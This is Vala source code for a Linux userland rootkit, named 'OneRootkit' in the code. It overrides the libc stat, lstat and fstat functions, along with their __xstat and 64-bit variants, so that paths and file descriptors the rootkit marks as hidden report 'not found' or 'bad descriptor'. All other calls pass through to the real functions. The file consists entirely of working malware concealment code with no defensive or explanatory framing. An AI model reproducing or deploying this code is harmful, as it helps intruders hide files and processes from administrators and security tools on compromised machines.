using Posix;

// delegate unowned int FxstatMethod(int ver, int fildes, Posix.Stat buf);
// delegate unowned int Fxstat64Method(int ver, int fildes, Posix.Stat64 buf);

// delegate unowned int LxstatMethod(int ver, string file, Posix.Stat buf);
// delegate unowned int Lxstat64Method(int ver, string file, Posix.Stat64 buf);

delegate unowned int LstatMethod(string path, Posix.Stat* buf);

delegate unowned int XstatMethod(int ver, string path, Posix.Stat* buf);
delegate unowned int Xstat64Method(int ver, string path, Posix.Stat64* buf);

delegate unowned int FxstatMethod(int ver, int fd, Posix.Stat* buf);
delegate unowned int Fxstat64Method(int ver, int fd, Posix.Stat64* buf);

public static int stat(string path, Posix.Stat* buf)
{
	XstatMethod oldXstat = (XstatMethod) DLHandles.LIBC().GetMethod("__xstat");

	if(OneRootkit.IsPathHidden(path))
	{
		GLib.errno = Posix.ENOENT;
		return -1;
	}

	return oldXstat(STAT_VER, path, buf);
}

public static int lstat(string path, Posix.Stat* buf)
{
	XstatMethod oldXstat = (XstatMethod) DLHandles.LIBC().GetMethod("__lxstat");

	if(OneRootkit.IsPathHidden(path))
	{
		GLib.errno = Posix.ENOENT;
		return -1;
	}

	return oldXstat(STAT_VER, path, buf);
}

public static int fstat(int fd, Posix.Stat* buf)
{
	FxstatMethod oldFxstat = (FxstatMethod) DLHandles.LIBC().GetMethod("__fxstat");

	if(OneRootkit.IsFdHidden(fd))
	{
		GLib.errno = Posix.EBADF;
		return -1;
	}

	return oldFxstat(STAT_VER, fd, buf);
}

public static int __xstat(int ver, string path, Posix.Stat* buf)
{
	XstatMethod oldXstat = (XstatMethod) DLHandles.LIBC().GetMethod("__xstat");

	if(OneRootkit.IsPathHidden(path))
	{
		GLib.errno = Posix.ENOENT;
		return -1;
	}

	return oldXstat(ver, path, buf);
}

public static int __lxstat(int ver, string path, Posix.Stat* buf)
{
	XstatMethod oldXstat = (XstatMethod) DLHandles.LIBC().GetMethod("__lxstat");

	if(OneRootkit.IsPathHidden(path))
	{
		GLib.errno = Posix.ENOENT;
		return -1;
	}

	return oldXstat(ver, path, buf);
}

public static int __fxstat(int ver, int fd, Posix.Stat* buf)
{
	FxstatMethod oldFxstat = (FxstatMethod) DLHandles.LIBC().GetMethod("__fxstat");

	if(OneRootkit.IsFdHidden(fd))
	{
		GLib.errno = Posix.EBADF;
		return -1;
	}

	return oldFxstat(ver, fd, buf);
}


public static int stat64(string path, Stat64* buf)
{
	Xstat64Method oldXstat64 = (Xstat64Method) DLHandles.LIBC().GetMethod("__xstat64");

	if(OneRootkit.IsPathHidden(path))
	{
		GLib.errno = Posix.ENOENT;
		return -1;
	}

	return oldXstat64(STAT_VER, path, buf);
}

public static int lstat64(string path, Stat64* buf)
{
	Xstat64Method oldXstat64 = (Xstat64Method) DLHandles.LIBC().GetMethod("__lxstat64");

	if(OneRootkit.IsPathHidden(path))
	{
		GLib.errno = Posix.ENOENT;
		return -1;
	}

	return oldXstat64(STAT_VER, path, buf);
}

public static int fstat64(int fd, Stat64* buf)
{
	Fxstat64Method oldFxstat64 = (Fxstat64Method) DLHandles.LIBC().GetMethod("__fxstat64");

	if(OneRootkit.IsFdHidden(fd))
	{
		GLib.errno = Posix.EBADF;
		return -1;
	}

	return oldFxstat64(STAT_VER, fd, buf);
}

public static int __xstat64(int ver, string path, Posix.Stat64* buf)
{
	Xstat64Method oldXstat64 = (Xstat64Method) DLHandles.LIBC().GetMethod("__xstat64");

	if(OneRootkit.IsPathHidden(path))
	{
		GLib.errno = Posix.ENOENT;
		return -1;
	}

	return oldXstat64(ver, path, buf);
}

public static int __lxstat64(int ver, string path, Posix.Stat64* buf)
{
	Xstat64Method oldXstat64 = (Xstat64Method) DLHandles.LIBC().GetMethod("__lxstat64");

	if(OneRootkit.IsPathHidden(path))
	{
		GLib.errno = Posix.ENOENT;
		return -1;
	}

	return oldXstat64(ver, path, buf);
}

public static int __fxstat64(int ver, int fd, Posix.Stat64* buf)
{
	Fxstat64Method oldFxstat64 = (Fxstat64Method) DLHandles.LIBC().GetMethod("__fxstat64");

	if(OneRootkit.IsFdHidden(fd))
	{
		GLib.errno = Posix.EBADF;
		return -1;
	}

	return oldFxstat64(ver, fd, buf);
}